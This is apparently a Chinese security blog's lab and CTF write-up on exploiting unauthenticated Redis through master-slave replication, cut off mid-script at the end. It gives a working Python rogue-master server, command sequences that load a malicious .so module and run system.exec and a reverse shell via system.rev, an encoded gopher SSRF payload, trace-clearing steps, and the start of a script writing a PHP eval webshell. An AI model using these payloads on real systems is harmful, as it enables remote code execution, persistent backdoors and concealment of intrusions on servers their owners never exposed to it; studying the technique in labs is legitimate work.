<p>可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/manqishizhizhu/article/details/123772523?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170383537616800182744632%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=170383537616800182744632&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-123772523-null-null.142%5Ev99%5Epc_search_result_base2&amp;utm_term=centos7%E5%BC%80%E5%90%AF%E4%B8%A4%E4%B8%AAredis%E5%AE%9E%E4%BE%8B&amp;spm=1018.2226.3001.4187">Centos7搭建多个Redis实例</a></p>
<pre><code class="hljs sh">redis-server /etc/redis/redis.conf 
redis-server /etc/redis/redis6380.conf <span class="hljs-comment">#这里需要在redis-server服务所在目录下启动，而后面的内容为redis配置文件路径</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229155122022.png" alt="image-20231229155122022"></p>
<p>可以看到均启动成功</p>
<p>我们把master_ip设置为<code>127.0.0.1</code>，master_port为<code>6380</code> --这里这个师傅是将6380所在redis服务器当做主服务器了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229155515379.png" alt="image-20231229155515379"></p>
<p>可以看到在成功设置主从关系之后，我们在6380主服务器上设置某些数据，之后在6379上可以看到数据的同步</p>
<p>如果我们想解除主从关系可以执行<code>SLAVEOF NO ONE</code></p>
<h2 id="redis-module">redis module</h2>
<p>自从Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，以一定的速度实现新的Redis命令，并具有类似于核心内部可以完成的功能。<br>
Redis模块是动态库，可以在启动时或使用<code>MODULE LOAD</code>命令加载到Redis中。</p>
<p>恶意so文件编写：<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK">https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK</a></p>
<h2 id="攻击原理">攻击原理</h2>
<p>利用步骤，贴一下PPT上的步骤</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229160136094.png" alt="image-20231229160136094"></p>
<p>slave和master的握手协议过程</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229160148389.png" alt="image-20231229160148389"></p>
<p>图中一些常量说明</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_CONNECTING 2 <span class="hljs-comment">/* 等待和master连接 */</span></span>
<span class="hljs-comment">/* --- 握手状态开始 --- */</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_RECEIVE_PONG 3 <span class="hljs-comment">/* 等待PING返回 */</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_SEND_AUTH 4 <span class="hljs-comment">/* 发送认证消息 */</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_RECEIVE_AUTH 5 <span class="hljs-comment">/* 等待认证回复 */</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_SEND_PORT 6 <span class="hljs-comment">/* 发送REPLCONF信息，主要是当前实例监听端口 */</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_RECEIVE_PORT 7 <span class="hljs-comment">/* 等待REPLCONF返回 */</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_SEND_CAPA 8 <span class="hljs-comment">/* 发送REPLCONF capa */</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_RECEIVE_CAPA 9 <span class="hljs-comment">/* 等待REPLCONF返回 */</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_SEND_PSYNC 10 <span class="hljs-comment">/* 发送PSYNC */</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_RECEIVE_PSYNC 11 <span class="hljs-comment">/* 等待PSYNC返回 */</span></span>
<span class="hljs-comment">/* --- 握手状态结束 --- */</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_TRANSFER 12 <span class="hljs-comment">/* 正在从master接收RDB文件 */</span></span></code></pre>
<p>这里的重点就是利用全量复制将master上的RDB文件同步到slave上，也就是将我们的恶意so文件传输到slave上，从而达到加载恶意so文件达到rce。</p>
<p>那为什么一定是全量复制呢，理由如下，当slave向master发送PSYNC命令之后，一般会得到三种回复：</p>
<ol>
<li>+FULLRESYNC：进行全量复制。</li>
<li>+CONTINUE：进行增量同步。</li>
<li>-ERR：当前master还不支持PSYNC。</li>
</ol>
<h3 id="全量复制的过程">全量复制的过程</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229162001398.png" alt="image-20231229162001398"></p>
<ul>
<li>slave向master发送PSYNC请求，并携带master的runid和offest，如果是第一次连接的话slave不知道master的runid，所以会返回runid为<code>?</code>，offest为<code>-1</code>，<strong>我们来测试以下看看是不是真的如此</strong></li>
</ul>
<p>这里我们先对6379的redis输入slave no one，解除他与6380redis之间的主从关系，接着kali开启监听，在6379上设置kali为redis的主服务器</p>
<p>这里我操作失误了，连接第二次我才搞懂得干嘛。。。似乎就是redis连接你之后，你需要回复指定命令与其进行通信，最后返回master的runid和offest，即：</p>
<pre><code class="hljs plaintext">主服务器需要执行的响应内容如下:

[&gt;] PING – 从服务器探测主服务器是否存活

[&lt;] +PONG  存活响应

[&gt;] REPLCONF – 交换主从节点复制信息

[&lt;] +OK     确认

[&gt;] PSYNC/SYNC – 同步状态以及传输方式

[&lt;] +FULLRESYNC  同步数据</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229163154621.png" alt="image-20231229163154621"></p>
<p>正确的应该是这样</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229163317518.png" alt="image-20231229163317518"></p>
<p>过程是这样的：</p>
<ul>
<li>master验证slave发来的runid是否和自身runid一致，如不一致，则进行全量复制。</li>
<li>master把自己的runid和offset发给slave，slave对master发来的runid和offest进行保存</li>
<li>master进行bgsave，生成RDB文件</li>
<li>master将写好的RDB文件传输给slave，并将缓冲区内的数据传输给slave</li>
<li>slave加载RDB文件和缓冲区数据</li>
</ul>
<h3 id="增量复制部分复制">增量复制（部分复制）</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229163432449.png" alt="image-20231229163432449"></p>
<p>增量复制的过程这里简单带过一下：就是当slave向master要求数据同步时，会发送master的runid和offest，如果runid和slave上的不对应则会进行全量复制，如果相同则进行数据同步，但是不会传输RDB文件</p>
<p>通过了解全量复制和增量复制的过程，我们应该大致知道为什么一定要用全量复制而不用增量复制了。</p>
<p>但是这样我感觉还是欠点什么，因为我认为我没有完全搞懂，又找了几篇文章发现这个解释的很好：</p>
<p>Redis提供了2种不同的持久化方式，RDB方式（在指定的时间间隔内生成数据集的时间点快照）和AOF方式（记录服务器执行的所有写操作命令）.AOF方式备份数据库的文件名默认为appendonly.aof，可以在配置文件中通过修改appendfilename参数进行修改，无法在客户端交互中动态设置appendfilename，而RDB方式备份数据库的文件名默认为dump.rdb，此文件名可以通过客户端交互动态设置dbfilename来更改。</p>
<p>这也说明了我们为何要选择RDB方式了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229163812136.png" alt="image-20231229163812136"></p>
<p>上图可以看到我们可以任意设置RDB文件名，但对于AOF却不行，而重点如下：</p>
<p>主从复制模式下数据单向从主节点流向从节点，<strong>在从节点首次注册时</strong>，会对主节点数据进行全量复制，复制过程中用offset记录读取的数据大小，以便中断后断点续传。如果从节点初始没有数据，通过主从复制，可以将主节点设置的dbfilename文件全量复制到从节点的dbfilename中，从而实现任意文件上传。</p>
<p>这也就说明了，攻击的时候似乎只能一次成功吗？毕竟如果第二次连接就不是首次注册了。。。</p>
<p>不过原理算是彻底明白了</p>
<h2 id="攻击流程">攻击流程</h2>
<p>第一个就是先配置一个攻击服务器，这个服务器是用于被受害者redis服务器连接的，也就是我们的靶机为从服务器，攻击机为主服务器（而恶意so文件就在我们的攻击机上）</p>
<p>而攻击机在于redis交互的过程中，需要发送如下信息：</p>
<pre><code class="hljs sh">PING 测试连接是否可用
+PONG 告诉slave连接可用
REPLCONF 发送REPLCONF信息，主要是当前实例监听端口
+OK 告诉slave成功接受
REPLCONF 发送REPLCONF capa
+OK 告诉slave成功接受
PSYNC &lt;rundi&gt; &lt;offest&gt; 发送PSYNC</code></pre>
<p>这里样的话才算成功的冒充为了一名合格的redis主服务器</p>
<p>如下图所示：这里我就借用了~~</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229164232337.png" alt="image-20231229164232337"></p>
<p>而此时的redis从服务器需要主动的发送如下信息（实际就是我们操控它发送）</p>
<pre><code class="hljs htaccess">Config set dir ./  设置redis的备份路径为当前目录

Config set dbfilename test.so  修改备份文件名

SLAVEOF host port 设置为对应服务器的从节点

MODULE LOAD ./test.so 加载复制过来的

SLAVEOF no one  关闭主从复制关系(防止脏数据复制)

System.exec ‘command’ 执行命令</code></pre>
<h3 id="任意文件写入">任意文件写入</h3>
<p>这里呢，我是先配置的redis服务对外开放6379端口，ssrf后续再说，这里开启之后呢，我并没有对redis设置登录密码，但同时要设置取消保护模式，同时对于监听本地127.0.0.1的那一行需要注释掉</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229215205554.png" alt="image-20231229215205554"></p>
<p>接下来我们kali连接测试一下，如下图可以看到能成功连接</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229220359116.png" alt="image-20231229220359116"></p>
<p>这里的话先连接上redis-server，之后设置备份文件目录，以及备份文件名，然后执行slaveof使其成为我们恶意服务的从redis，恶意 master 在接收到 redis-server 的 <code>PSYNC</code> 命令后，返回 <code>FULLRESYNC</code> 命令，并将 payload 紧跟着发送。最终 payload 被写到 redis-server 的 <code>/var/www/html/exp.txt</code> 当中</p>
<p>恶意master如下</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> argparse
<span class="hljs-keyword">import</span> socketserver
<span class="hljs-keyword">import</span> logging
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> time

logging.basicConfig(stream=sys.stdout, level=logging.INFO, <span class="hljs-built_in">format</span>=<span class="hljs-string">'&gt;&gt; %(message)s'</span>)

DELIMITER = <span class="hljs-string">b"\r\n"</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">RoguoHandler</span>(socketserver.BaseRequestHandler):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self, data</span>):
        <span class="hljs-keyword">if</span> data.startswith(<span class="hljs-string">b'*'</span>):
            <span class="hljs-keyword">return</span> data.strip().split(DELIMITER)[<span class="hljs-number">2</span>::<span class="hljs-number">2</span>]
        <span class="hljs-keyword">if</span> data.startswith(<span class="hljs-string">b'$'</span>):
            <span class="hljs-keyword">return</span> data.split(DELIMITER, <span class="hljs-number">2</span>)[<span class="hljs-number">1</span>]

        <span class="hljs-keyword">return</span> data.strip().split()

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            data = self.request.recv(<span class="hljs-number">1024</span>)
            <span class="hljs-built_in">print</span>(data)
            logging.info(<span class="hljs-string">"receive data: %r"</span>, data)
            arr = self.decode(data)
            <span class="hljs-keyword">if</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b'PING'</span>):
                self.request.sendall(<span class="hljs-string">b'+PONG'</span> + DELIMITER)
            <span class="hljs-keyword">elif</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b'REPLCONF'</span>):
                self.request.sendall(<span class="hljs-string">b'+OK'</span> + DELIMITER)
            <span class="hljs-keyword">elif</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b'PSYNC'</span>) <span class="hljs-keyword">or</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b'SYNC'</span>):
                self.request.sendall(<span class="hljs-string">b'+FULLRESYNC '</span> + <span class="hljs-string">b'Z'</span> * <span class="hljs-number">40</span> + <span class="hljs-string">b' 1'</span> + DELIMITER)
                self.request.sendall(<span class="hljs-string">b'$'</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(self.server.payload)).encode() + DELIMITER)
                self.request.sendall(self.server.payload + DELIMITER)
                <span class="hljs-keyword">break</span>

        self.finish()

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>(<span class="hljs-params">self</span>):
        self.request.close()

<span class="hljs-keyword">class</span> <span class="hljs-title class_">RoguoServer</span>(socketserver.TCPServer):
    allow_reuse_address = <span class="hljs-literal">True</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, server_address, payload</span>):
        <span class="hljs-built_in">super</span>(RoguoServer, self).__init__(server_address, RoguoHandler, <span class="hljs-literal">True</span>)
        self.payload = payload

<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">'__main__'</span>:
    expfile = <span class="hljs-string">'/home/hybcx/flag.txt'</span>  <span class="hljs-comment">#我们要传输的恶意文件的路径</span>
    lport = <span class="hljs-number">6666</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(expfile, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:
        server = RoguoServer((<span class="hljs-string">'0.0.0.0'</span>, lport), f.read())
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] listening ......"</span>)
    server.handle_request()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] completed ~~~"</span>)</code></pre>
<p>之后现在kali上执行如下命令：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229220743984.png" alt="image-20231229220743984"></p>
<p>配置好之后，我们开启恶意master</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229221144741.png" alt="image-20231229221144741"></p>
<p>当其运行结束后，我们在靶机上即可查看到flag.txt被写入。这里肯定想着为何kali上执行个py就写入了呢，因为在此之前我们已经将我们的恶意master设置为了主redis，那我们在其中的任何操作，都可以同步到从redis，也就是我们的靶机，我们这里的py逻辑就是与从服务器命令交互完，直接发送payload，造成文件上传</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229221135874.png" alt="image-20231229221135874"></p>
<p>实际上细细研究发现这里似乎存在一个时间问题，比如我早就在从redis上配置好了我主redis的ip即端口，但此时主redis还没开启，是休眠状态，但一当我开启主redis，从redis就会向主redis发送PING命令，等待具体的回复，究竟是要进行全量复制，还是增量复制等等等等。而我们上述的恶意master会在从redis发送给我们PING命令之后给予相关的回应，最后发送给从redis进行全量复制的命令，最终导致我们的恶意文件上传效果。</p>
<h3 id="redis加载恶意so"><a target="_blank" rel="noopener" href="http://xn--redis-j86ho04f88am66w.so">redis加载恶意.so</a></h3>
<p>这里思路大致与上述一直，这里我们改一下配置即可（注意这里依旧是利用redis未授权）</p>
<pre><code class="hljs php"><span class="hljs-comment">#设置redis的备份路径为当前目录</span>
config set dir ./   
<span class="hljs-comment">#设置备份文件名为exp.so，默认为dump.rdb</span>
config set dbfilename exp.so
<span class="hljs-comment">#设置主服务器IP和端口</span>
slaveof <span class="hljs-number">192.168</span>.<span class="hljs-number">172.129</span> <span class="hljs-number">1234</span>  
<span class="hljs-comment">#加载恶意模块</span>
module load ./exp.so
<span class="hljs-comment">#执行系统命令</span>
system.exec <span class="hljs-string">'whoami'</span>
system.rev <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">9999</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231230161304017.png" alt="image-20231230161304017"></p>
<p>如图所示，配置好后我们开启恶意master，但这里不知道为何设置备份目录为当前的时候不成功。。。就先设置tmp了</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> argparse
<span class="hljs-keyword">import</span> socketserver
<span class="hljs-keyword">import</span> logging
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> time

logging.basicConfig(stream=sys.stdout, level=logging.INFO, <span class="hljs-built_in">format</span>=<span class="hljs-string">'&gt;&gt; %(message)s'</span>)

DELIMITER = <span class="hljs-string">b"\r\n"</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">RoguoHandler</span>(socketserver.BaseRequestHandler):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self, data</span>):
        <span class="hljs-keyword">if</span> data.startswith(<span class="hljs-string">b'*'</span>):
            <span class="hljs-keyword">return</span> data.strip().split(DELIMITER)[<span class="hljs-number">2</span>::<span class="hljs-number">2</span>]
        <span class="hljs-keyword">if</span> data.startswith(<span class="hljs-string">b'$'</span>):
            <span class="hljs-keyword">return</span> data.split(DELIMITER, <span class="hljs-number">2</span>)[<span class="hljs-number">1</span>]

        <span class="hljs-keyword">return</span> data.strip().split()

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            data = self.request.recv(<span class="hljs-number">1024</span>)
            <span class="hljs-built_in">print</span>(data)
            logging.info(<span class="hljs-string">"receive data: %r"</span>, data)
            arr = self.decode(data)
            <span class="hljs-keyword">if</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b'PING'</span>):
                self.request.sendall(<span class="hljs-string">b'+PONG'</span> + DELIMITER)
            <span class="hljs-keyword">elif</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b'REPLCONF'</span>):
                self.request.sendall(<span class="hljs-string">b'+OK'</span> + DELIMITER)
            <span class="hljs-keyword">elif</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b'PSYNC'</span>) <span class="hljs-keyword">or</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b'SYNC'</span>):
                self.request.sendall(<span class="hljs-string">b'+FULLRESYNC '</span> + <span class="hljs-string">b'Z'</span> * <span class="hljs-number">40</span> + <span class="hljs-string">b' 1'</span> + DELIMITER)
                self.request.sendall(<span class="hljs-string">b'$'</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(self.server.payload)).encode() + DELIMITER)
                self.request.sendall(self.server.payload + DELIMITER)
                <span class="hljs-keyword">break</span>

        self.finish()

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>(<span class="hljs-params">self</span>):
        self.request.close()

<span class="hljs-keyword">class</span> <span class="hljs-title class_">RoguoServer</span>(socketserver.TCPServer):
    allow_reuse_address = <span class="hljs-literal">True</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, server_address, payload</span>):
        <span class="hljs-built_in">super</span>(RoguoServer, self).__init__(server_address, RoguoHandler, <span class="hljs-literal">True</span>)
        self.payload = payload

<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">'__main__'</span>:
    expfile = <span class="hljs-string">'/home/hybcx/Tools/redis-rogue-getshell/exp.so'</span>  <span class="hljs-comment">#我们要传输的恶意文件的路径</span>
    lport = <span class="hljs-number">6666</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(expfile, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:
        server = RoguoServer((<span class="hljs-string">'0.0.0.0'</span>, lport), f.read())
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] listening ......"</span>)
    server.handle_request()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] completed ~~~"</span>)</code></pre>
<p>记得修改恶意文件路径吗，如下图运行之后执行system命令成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231230161411475.png" alt="image-20231230161411475"></p>
<h3 id="ssrf进行redis加载so"><a target="_blank" rel="noopener" href="http://xn--SSRFredis-ew5o4638bnbsay8a.so">SSRF进行redis加载.so</a></h3>
<p>这里虽然进行了上述的实操，但感觉不够真实，毕竟感觉现实中存在ssrf的概率才是大的，虽然可以爆破弱口令，但总感觉少点什么。而且这里的ssrf攻击的过程一直没搞成功，现在再来搞一下。</p>
<p>这里我们先取消redis的主从关系，并且重新配置文件，开启目标redis的保护模式，以及只让其监听本地127.0.0.1。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231230161948095.png" alt="image-20231230161948095"></p>
<p>之后重启redis服务</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231230162228324.png" alt="image-20231230162228324"></p>
<p>确定一下对方服务的配置，现在我们进行构造恶意命令</p>
<pre><code class="hljs php"><span class="hljs-comment">#第一次攻击</span>
config set dir /tmp
config set dbfilename exp.so
slaveof <span class="hljs-number">192.168</span>.<span class="hljs-number">246.130</span> <span class="hljs-number">6666</span>
<span class="hljs-comment">#第二次攻击</span>
module load /tmp/exp.so
system.exec <span class="hljs-string">"id"</span></code></pre>
<p>在这里分两次是因为第一次我们在传入命令之后，exp.so还未被加载，之后第二次才输入的加载指令，当然你也可以合并上述两个payload，然后发送两次。</p>
<pre><code class="hljs scss">gopher://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6379</span>/_config%<span class="hljs-number">2520s</span>et%<span class="hljs-number">2520</span>dir%<span class="hljs-number">2520</span>/tmp%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aconfig%<span class="hljs-number">2520s</span>et%<span class="hljs-number">2520</span>dbfilename%<span class="hljs-number">2520ex</span>p.so%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aslaveof%<span class="hljs-number">2520192.168</span>.<span class="hljs-number">246.130%</span><span class="hljs-number">25206666%</span><span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Amodule%<span class="hljs-number">2520</span>load%<span class="hljs-number">2520</span>/tmp/exp.so%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Asystem.exec%<span class="hljs-number">2520%</span><span class="hljs-number">2522</span>id%<span class="hljs-number">2522%</span><span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A</code></pre>
<p>这里进行了两次编码，但是在我发送两次之后页面并没有回显，不知道是否是配置问题，但在靶机上测试如下，发现是成功加载的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231230165445669.png" alt="image-20231230165445669"></p>
<p>这让我突然迷惑了，是否我太过钻牛角尖了，本来如果这里存在ssrf的话，我们本就可以进行写入公钥，写webshell等等，这样的话我们完全就可以连接上对方redis服务，这样的话就没必要非得利用ssrf来rce了。这里的疑惑还是通过一会儿的做题来感受吧。。。</p>
<h2 id="痕迹清除">痕迹清除</h2>
<p>为了减少对服务器的影响，攻击完成后，应该尽量清除痕迹，需要恢复目录和数据库文件，卸载同时删除模块，而数据原本的配置信息，需要在攻击之前进行备份。</p>
<pre><code class="hljs php">CONFIG get *    <span class="hljs-comment"># 获取所有的配置</span>
CONFIG get dir   <span class="hljs-comment"># 获取 快照文件 保存的 位置</span>
CONFIG get dbfilename   <span class="hljs-comment"># 获取 快照文件 的文件名</span>
<span class="hljs-comment">#切断主从，关闭复制功能</span>
slaveof no one 
<span class="hljs-comment">#恢复目录</span>
config set dir /data
<span class="hljs-comment">#通过dump.rdb文件恢复数据</span>
config set dbfilename dump.rdb
<span class="hljs-comment">#删除exp.so</span>
system.exec <span class="hljs-string">'rm ./exp.so'</span>
<span class="hljs-comment">#卸载system模块的加载</span>
module unload system</code></pre>
<p>漏洞利用的版本是redis 4.x/5.x ，如果是先前版本的Redis，则无法加载模块，自然也就无法利用。在网上开了几个开源的利用脚本，都没有进行版本的判断，如果直接使用exp，除了攻击失败外，可能会修改了 dir 和dbfilename ，这些都可以通过redis未授权修改回原来的配置（前提是有提前备份），而目录下会多生成一个 exp.so文件。</p>
<h1 id="0x06-题目实战">0x06 题目实战</h1>
<h2 id="ctfhub-ssrf-redis协议">CTFHUB-SSRF-redis协议</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231230172330268.png" alt="image-20231230172330268"></p>
<p>看到url，那开始测试</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231230172356029.png" alt="image-20231230172356029"></p>
<p>发现存在6379的redis服务，那我们看看是否对方redis设置了密码，脚本跑一下，如下图，发现没有设置</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231230172618573.png" alt="image-20231230172618573"></p>
<p>那这里我想的就是先尝试写webshell，话不多说直接上脚本</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib
protocol=<span class="hljs-string">"gopher://"</span>
ip=<span class="hljs-string">"127.0.0.1"</span>
port=<span class="hljs-string">"6379"</span>
shell=<span class="hljs-string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span>
filename=<span class="hljs-string">"shell.php"</span>
path=<span class="hljs-string">"/var/www/html"</span>
passwd=<span class="hljs-string">""</span>
cmd=[<span class="hljs-string">"flushall"</span>,
     <span class="hljs-string">"set 1 {}"</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">" "</span>,<span class="hljs-string">"${IFS}"</span>)),
     <span class="hljs-string">"config set dir {}"</span>.<span class="hljs-built_in">format</span>(path),
     <span class="hljs-string">"config set dbfilename {}"</span>.<span class="hljs-built_in">format</span>(filename),
     <span class="hljs-string">"save"</span>
     ]
<span class="hljs-keyword">if</span> passwd:
    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
payload=protocol+ip+<span class="hljs-string">":"</span>+port+<span class="hljs-string">"/_"</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):
    CRLF=<span class="hljs-string">"\r\n"</span>
    redis_arr = arr.split(<span class="hljs-string">" "</span>)
